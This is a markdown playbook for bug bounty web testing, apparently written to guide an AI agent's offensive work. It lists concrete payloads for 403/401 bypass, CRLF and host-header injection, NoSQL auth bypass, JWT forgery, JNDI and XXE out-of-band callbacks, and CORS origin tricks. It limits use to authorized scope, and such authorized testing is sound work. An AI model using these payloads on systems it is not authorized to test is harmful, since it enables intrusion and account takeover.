# Vuln-Class Playbooks (extended)

Distilled from **shuvonsec/claude-bug-bounty** commands, folded into T3MP3ST doctrine. These cover classes our base `payloads.md` treats lightly. All active → in-scope + authorized only; one reversible probe at a time; VERIFY + REFUTE before any becomes a finding.

## 403 / 401 bypass
When an endpoint returns 403/401, run the disclosed-report battery before giving up:
- **IP-spoof headers:** `X-Forwarded-For: 127.0.0.1`, `True-Client-IP`, `CF-Connecting-IP`, `X-Originating-IP`, `X-ProxyUser-Ip`, `Client-IP`, `Forwarded`, `X-Remote-Addr`, `X-Remote-IP`, `Via`, `X-HTTP-Method-Override`.
- **Path tricks:** `/%2e/`, `/%252e/`, `/.`, `/xxx/`, `/xxx;/`, `/xxx..;/`, `/xxx%20`, `/xxx%09`, `//xxx`, `/./xxx`.
- **Suffix tricks:** `/xxx.json`, `/xxx.html`, `/xxx.css`, `/xxx#`.
- **Method tampering:** POST/PUT/PATCH/TRACE on a GET-only route.
- **Content-Type confusion:** `application/json` POST, `multipart/form-data`, dual Content-Type.
- **Vendor-specific:** Cloudflare (TE + X-Forwarded-Host), AWS WAF (`/**/` comment split), Imperva (`%c0%2e`), F5 (double-slash).
- **WAF fingerprint first:** `cf-ray`→Cloudflare, `x-amzn`→AWS, `TS` cookie→F5, `incap_ses`→Imperva → apply that vendor's trick. `wafw00f` if installed.
- Tool: `byp4xx` (lobuhi/byp4xx) if installed; else the curl matrix above. A 200/302 on any variant that the plain request denied = candidate → VERIFY the response actually contains protected content.

## CRLF / HTTP response splitting + host-header injection
- Inject `%0d%0a` (and `%0D%0A`, `%23%0d%0a`, `\r\n`) into path/params/headers → attempt `Set-Cookie:` injection, cache poisoning, open-redirect via injected `Location:`.
- Host-header injection: swap `Host:` / add `X-Forwarded-Host:` → look for reflection in links, password-reset poisoning, cache key confusion.
- Confirm by observing the injected header actually appears in the response (VERIFY on raw output).

## NoSQL injection (MongoDB / Mongoose / operator DBs)
- **Auth bypass (operator injection):** login with `{"$ne": null}` / `{"$gt": ""}` in user/pass fields (JSON body or `user[$ne]=` bracket syntax in form/query).
- **Query injection:** bracket syntax `field[$regex]=`, `field[$ne]=`.
- **Blind:** `$where` time-based (`sleep`), boolean-differential like SQLi.
- Probe login: `--user-field email --pass-field password` with the operator payloads; a successful auth with a non-credential = confirmed.

## JWT attacks (offline — no network)
- **alg:none forgery:** set header `alg:none`, strip signature → does the server accept it?
- **RS256→HS256 confusion:** re-sign the token with the server's *public* key as an HMAC secret.
- **Weak-secret crack:** dictionary-crack the HS256 secret (`john`/`hashcat`/wordlist).
- **Claim analysis:** decode and inspect `exp`, `iss`, `aud`, role/priv claims, `kid`/`jku` for injection.
- Base decode is local: `printf '%s' "$TOKEN" | cut -d. -f2 | base64 -d | jq .`

## Out-of-band (OOB) — confirm BLIND classes
Blind SSRF / XXE / SQLi / RCE / Log4Shell produce no direct response — confirm via callback:
- Use an interactsh (or Burp Collaborator) domain; embed it in payloads (`http://<oob>/`, `${jndi:ldap://<oob>/a}`, XXE SYSTEM entity, SQLi `LOAD_FILE`/`xp_dirtree`).
- **Correlate:** a DNS/HTTP callback to your OOB domain tied to a specific payload = confirmed. **No callback = not confirmed** (stays hypothesis).

## Hidden-parameter discovery (feeder — do early)
- Hidden params are missed by scanners and feed IDOR/SSRF/LFI/open-redirect/authz-bypass.
- Tool: `arjun` (or `x8`) against a URL/list; also mine JS + `wordlists/params.txt` (folded into `brain/payloads/params.txt`, 6.4k params).
- Every new param → test it across the vuln classes above.

## CORS (extended)
Beyond the base check: null-origin trust (`Origin: null`), suffix/prefix regex bypass (`Origin: https://target.com.evil.com`, `https://eviltarget.com`), scheme downgrade. Credentialed reflection (ACAO reflects Origin + `ACAC: true`) = critical.

---
**Wordlists now in the brain** (`brain/payloads/`): `sensitive-files` (109), `params` (6.4k), `api-endpoints` (298), `content-discovery` (4.75k). Big dir list: `wordlists/raft-medium-dirs.txt` (30k) — point `ffuf -w` at it. Fuller per-class payloads: `payload-arsenal.md`.
